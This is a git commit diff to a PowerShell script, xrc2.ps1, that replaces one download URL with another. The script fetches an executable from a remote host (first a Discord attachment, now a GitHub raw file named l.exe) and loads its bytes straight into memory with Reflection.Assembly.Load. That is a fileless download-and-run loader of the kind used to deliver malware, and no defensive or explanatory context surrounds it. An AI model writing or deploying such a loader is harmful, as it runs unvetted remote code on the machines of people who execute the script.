627c5841982f469cfe737ea22a6aac011e9a1104
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-06-09 22:48:15 -0300

    Update xrc2.ps1

--- xrc2.ps1
+++ xrc2.ps1
@@ -1,4 +1,4 @@
-$link = "https://cdn.discordapp.com/attachments/1453828966602506280/1493765878637006918/VisonFree.exe?ex=6a221462&is=6a20c2e2&hm=65f554a0268389ecb599e563f75fe1eb1bcb52ef004a64d747cc991b13b2deba&"
+$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe"
 $webClient = New-Object System.Net.WebClient
 $bytes = $webClient.DownloadData($link)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
